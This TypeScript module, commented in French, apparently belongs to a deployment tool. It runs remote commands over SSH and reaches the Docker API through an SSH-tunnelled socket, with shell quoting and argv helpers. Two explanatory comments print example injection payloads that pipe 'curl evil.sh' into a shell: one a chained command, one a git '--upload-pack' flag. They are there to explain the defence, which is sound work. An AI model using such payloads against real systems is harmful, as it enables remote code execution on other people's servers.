// Accès aux serveurs cibles. Agentless : rien à installer en face, tout passe
// par SSH.
//
// Deux chemins distincts, et il faut comprendre pourquoi il y en a deux :
//
//   exec()          lance une commande dans un shell distant. Nécessaire pour
//                   ce qui n'a pas d'API : nixpacks, git, l'installation de
//                   Docker. La sortie est du texte, à streamer.
//
//   dockerClient()  parle à l'API Docker Engine à travers un tunnel SSH vers
//                   /var/run/docker.sock. Réponses structurées, pas de parsing
//                   de texte — et la Phase 0 a montré pourquoi ça compte :
//                   `docker service update` renvoie 0 après un rollback, donc
//                   l'état réel ne se lit que dans UpdateStatus.State.
//
// L'utilisateur SSH DOIT appartenir au groupe `docker`. dockerode se connecte
// au socket directement : il n'y a pas de `sudo` possible sur une socket.
import http from "node:http";
import type { Duplex } from "node:stream";
import Docker from "dockerode";
import { Client, type ConnectConfig } from "ssh2";

// Ré-exporté pour que les paquets qui consomment l'exécuteur (build-engine,
// worker) n'aient pas à dépendre de ssh2 eux-mêmes. Le transport est un détail
// de ce paquet : le jour où il change, il ne doit pas changer partout.
export type SshClient = Client;

// Idem pour le client Docker : les appelants manipulent l'API Engine sans
// avoir à déclarer dockerode dans leurs propres dépendances.
export type DockerApi = Docker;

export interface ServerCredentials {
  host: string;
  passphrase?: string;
  port?: number;
  /** Clé privée au format PEM. Chiffrée au repos côté base, déchiffrée ici. */
  privateKey: string;
  user: string;
}

export interface ExecResult {
  code: number | null;
  signal?: string;
  stderr: string;
  stdout: string;
}

// Pas de parameter properties (`constructor(readonly x: T)`) ici. Le mode
// strip-only de Node les refuse — il retire les types sans les transformer, or
// ce sucre génère du code. Ce paquet est chargé par `apps/worker`, qui tourne
// sur Node. `erasableSyntaxOnly` dans @noddle/tsconfig l'impose mécaniquement.
export class SshError extends Error {
  readonly host: string;
  override readonly cause?: unknown;

  constructor(message: string, host: string, cause?: unknown) {
    super(message);
    this.name = "SshError";
    this.host = host;
    this.cause = cause;
  }
}

function connectConfig(creds: ServerCredentials): ConnectConfig {
  return {
    host: creds.host,
    keepaliveCountMax: 8,
    // Un déploiement dure des minutes. Sans keepalive, un NAT ou un pare-feu
    // coupe la session au milieu d'un build et l'échec est illisible.
    keepaliveInterval: 15_000,
    passphrase: creds.passphrase,
    port: creds.port ?? 22,
    privateKey: creds.privateKey,
    readyTimeout: 20_000,
    username: creds.user,
  };
}

export function connect(creds: ServerCredentials): Promise<Client> {
  return new Promise((resolve, reject) => {
    const client = new Client();
    const onError = (err: Error) => {
      client.removeAllListeners();
      reject(
        new SshError(`connexion SSH échouée: ${err.message}`, creds.host, err)
      );
    };
    client.once("ready", () => {
      client.removeListener("error", onError);
      resolve(client);
    });
    client.once("error", onError);
    client.connect(connectConfig(creds));
  });
}

export interface ExecOptions {
  onStderr?: (chunk: string) => void;
  /** Appelé ligne par ligne. C'est ce qui alimentera le flux SSE des logs. */
  onStdout?: (chunk: string) => void;
}

export function exec(
  client: Client,
  command: string,
  opts: ExecOptions = {}
): Promise<ExecResult> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) {
        return reject(err);
      }

      let stdout = "";
      let stderr = "";
      let code: number | null = null;
      let signal: string | undefined;

      stream.on("data", (d: Buffer) => {
        const s = d.toString("utf8");
        stdout += s;
        opts.onStdout?.(s);
      });
      stream.stderr.on("data", (d: Buffer) => {
        const s = d.toString("utf8");
        stderr += s;
        opts.onStderr?.(s);
      });
      // `exit` porte le code, `close` marque la fin réelle du flux. Résoudre
      // sur `exit` tronque la sortie.
      stream.on("exit", (c: number | null, sig?: string) => {
        code = c;
        signal = sig;
      });
      stream.on("close", () => resolve({ code, signal, stderr, stdout }));
    });
  });
}

/**
 * Plafond de la sortie d'erreur retenue par `execStream`. Un dumper bavard ne
 * doit pas faire gonfler la mémoire du worker ; les premiers kilo-octets
 * portent la cause, la suite est de la répétition.
 */
const STREAM_STDERR_MAX = 64 * 1024;

export interface ExecStreamIo {
  /**
   * Entrée standard du processus distant. C'est le MÊME objet que `stdout` —
   * un canal ssh2 est un Duplex — mais nommé séparément parce que les deux
   * sens ne servent jamais dans le même appel.
   */
  stdin: NodeJS.WritableStream;
  /**
   * Sortie standard BRUTE : des octets, jamais décodés. Le consommateur DOIT
   * la lire jusqu'au bout (ou appeler `.resume()` s'il ne s'en sert pas) :
   * sans lecteur, la fenêtre du canal se remplit et le processus distant se
   * bloque à l'écriture, ce qui ressemble à un serveur qui ne répond plus.
   */
  stdout: NodeJS.ReadableStream;
}

export interface ExecStreamResult<T> {
  code: number | null;
  signal?: string;
  stderr: string;
  /** Ce que le consommateur a renvoyé. */
  value: T;
}

/**
 * Exécute une commande distante en donnant accès aux flux BRUTS.
 *
 * `exec()` ne peut pas servir ici : il concatène toute la sortie dans une
 * chaîne UTF-8. Sur un dump binaire de plusieurs gigaoctets, cela corrompt les
 * octets ET fait exploser la mémoire du worker. Cette fonction ne garde jamais
 * la sortie standard.
 *
 * Le code de sortie est renvoyé APRÈS que le consommateur a terminé, et c'est
 * tout l'intérêt : un `pg_dump` qui meurt à mi-course ferme proprement son
 * flux, l'objet se téléverse sans erreur et RIEN dans les octets ne dit qu'il
 * en manque. Mesuré contre RustFS. Seul le code de sortie distingue une
 * sauvegarde d'une moitié de sauvegarde — c'est le miroir exact de « a failed
 * deploy exits 0 ». D'où la forme à consommateur plutôt qu'un objet de flux
 * rendu à l'appelant : on ne peut pas oublier d'attendre le code.
 */
export function execStream<T>(
  client: Client,
  command: string,
  consume: (io: ExecStreamIo) => Promise<T>
): Promise<ExecStreamResult<T>> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) {
        reject(err);
        return;
      }

      let stderr = "";
      let code: number | null = null;
      let signal: string | undefined;

      stream.stderr.on("data", (d: Buffer) => {
        if (stderr.length < STREAM_STDERR_MAX) {
          stderr += d.toString("utf8");
        }
      });
      stream.on("exit", (c: number | null, sig?: string) => {
        code = c;
        signal = sig;
      });

      // `exit` porte le code, `close` marque la fin réelle du canal. Attendre
      // `close` est ce qui garantit que le code est déjà posé quand on résout
      // — même raison que dans `exec`.
      const closed = new Promise<void>((res) => {
        stream.on("close", () => res());
      });

      consume({ stdin: stream, stdout: stream })
        .then(async (value) => {
          await closed;
          resolve({ code, signal, stderr, value });
        })
        .catch((consumeErr: unknown) => {
          // Sans ça, la commande distante continue de tourner et de produire
          // dans le vide : le canal reste ouvert et la promesse ne retombe
          // jamais.
          stream.destroy();
          reject(consumeErr);
        });
    });
  });
}

/**
 * Échappe un argument pour un shell POSIX.
 *
 * `exec()` transmet une CHAÎNE, que le shell distant interprète. Tout ce qui
 * vient de l'utilisateur — URL de dépôt, nom de branche, domaine, nom de
 * service, valeur de variable d'environnement — est une injection de commande
 * sur le serveur du client si on le concatène tel quel :
 *
 *     git clone https://x/y.git; curl evil.sh | sh
 *
 * Guillemets simples partout, et la seule séquence à traiter est le guillemet
 * simple lui-même : on ferme, on en insère un échappé, on rouvre.
 */
export function quoteArg(arg: string): string {
  return `'${arg.replaceAll("'", `'\\''`)}'`;
}

/**
 * Variante sûre d'`exec` : la commande est un tableau, chaque élément est
 * échappé. À PRÉFÉRER systématiquement dès qu'une valeur ne vient pas d'une
 * constante du code.
 *
 * ATTENTION — ceci arrête l'injection SHELL, pas l'injection d'ARGUMENT.
 * Une valeur commençant par `-` reste un token argv distinct, que le programme
 * appelé lira comme un drapeau :
 *
 *     git clone --upload-pack='curl evil.sh|sh' ...
 *
 * exécute une commande arbitraire, et aucun guillemet n'y change rien puisque
 * le shell n'est pas en cause. Chaque appelant doit donc, en plus :
 *   - refuser les valeurs commençant par `-` ;
 *   - poser `--` avant les positionnels quand la commande le supporte ;
 *   - énumérer ce qui est permis plutôt que d'interdire au cas par cas, car
 *     certains vecteurs ne ressemblent pas à des drapeaux (`ext::sh -c …`).
 * Voir `assertNotFlag` dans @noddle/build-engine.
 */
export function execArgv(
  client: Client,
  argv: readonly string[],
  opts: ExecOptions = {}
): Promise<ExecResult> {
  if (argv.length === 0) {
    throw new TypeError("argv vide");
  }
  return exec(client, argv.map(quoteArg).join(" "), opts);
}

/**
 * `execStream` avec la même discipline qu'`execArgv` : la commande est un
 * tableau, chaque élément est échappé. Les mêmes avertissements s'appliquent —
 * ceci arrête l'injection SHELL, pas l'injection d'ARGUMENT.
 */
export function execStreamArgv<T>(
  client: Client,
  argv: readonly string[],
  consume: (io: ExecStreamIo) => Promise<T>
): Promise<ExecStreamResult<T>> {
  if (argv.length === 0) {
    throw new TypeError("argv vide");
  }
  return execStream(client, argv.map(quoteArg).join(" "), consume);
}

export function disconnect(client: Client): void {
  client.end();
}

/**
 * Écrit un fichier distant par SFTP plutôt qu'un heredoc passé à `exec` :
 * un fichier compose généré peut contenir n'importe quel octet (guillemets,
 * `$`, backticks), et le faire traverser un shell distant rouvrirait
 * exactement la classe d'injection que `quoteArg` existe pour fermer côté
 * argument.
 */
export function writeRemoteFile(
  client: Client,
  path: string,
  content: string
): Promise<void> {
  return new Promise((resolve, reject) => {
    client.sftp((err, sftp) => {
      if (err) {
        reject(err);
        return;
      }
      sftp.writeFile(path, content, (writeErr) => {
        sftp.end();
        if (writeErr) {
          reject(writeErr);
          return;
        }
        resolve();
      });
    });
  });
}

/** Ouvre une connexion, exécute, referme — même si `fn` lève. */
export async function withServer<T>(
  creds: ServerCredentials,
  fn: (client: Client) => Promise<T>
): Promise<T> {
  const client = await connect(creds);
  try {
    return await fn(client);
  } finally {
    disconnect(client);
  }
}

/**
 * Agent HTTP dont chaque connexion est un canal SSH vers la socket Docker
 * distante. C'est l'extension OpenSSH `direct-streamlocal@openssh.com`, la
 * même que `ssh -L /chemin/local:/var/run/docker.sock`.
 */
class SshSocketAgent extends http.Agent {
  private readonly client: Client;
  private readonly socketPath: string;

  constructor(client: Client, socketPath: string) {
    // keepAlive désactivé volontairement : l'agent HTTP de Node appelle
    // socket.setKeepAlive() sur la connexion rendue, et un Channel ssh2 est un
    // Duplex, pas un net.Socket — la méthode n'existe pas.
    super({ keepAlive: false, maxSockets: 8 });
    this.client = client;
    this.socketPath = socketPath;
  }

  // Signature imposée par http.Agent, qui accepte `Duplex | null | undefined`.
  // On déclare `undefined` : le canal SSH s'ouvre de façon asynchrone et
  // repart par le callback, jamais par la valeur de retour. Déclarer l'union
  // complète obligerait à un `return undefined` explicite, que Biome supprime
  // aussitôt (règle noUselessUndefined) — d'où un TS2355 en boucle.
  override createConnection(
    _options: http.ClientRequestArgs,
    callback?: (err: Error | null, stream: Duplex) => void
  ): undefined {
    this.client.openssh_forwardOutStreamLocal(
      this.socketPath,
      (err, stream) => {
        if (err) {
          callback?.(err, null as unknown as Duplex);
          return;
        }
        // Un Channel ssh2 est un Duplex, pas un net.Socket. Le client HTTP de
        // Node appelle malgré tout des méthodes de socket dessus. On fournit
        // les no-op manquants plutôt que de laisser fuir un TypeError depuis
        // les entrailles de node:_http_agent, illisible à l'usage.
        const sock = stream as unknown as Record<string, unknown>;
        for (const m of [
          "setKeepAlive",
          "setNoDelay",
          "setTimeout",
          "ref",
          "unref",
        ]) {
          if (typeof sock[m] !== "function") {
            sock[m] = () => stream;
          }
        }
        callback?.(null, stream as unknown as Duplex);
      }
    );
  }
}

export interface DockerClientOptions {
  socketPath?: string;
}

/**
 * Client Docker branché sur le daemon distant via le tunnel SSH déjà ouvert.
 *
 * L'hôte et le port passés à dockerode sont fictifs : l'agent ignore les deux
 * et forwarde toujours vers la socket. Ils ne servent qu'à faire construire à
 * dockerode des URL HTTP valides.
 */
export function dockerClient(
  client: Client,
  opts: DockerClientOptions = {}
): Docker {
  const socketPath = opts.socketPath ?? "/var/run/docker.sock";
  return new Docker({
    agent: new SshSocketAgent(client, socketPath),
    host: "docker",
    port: 80,
    protocol: "http",
  } as Docker.DockerOptions);
}
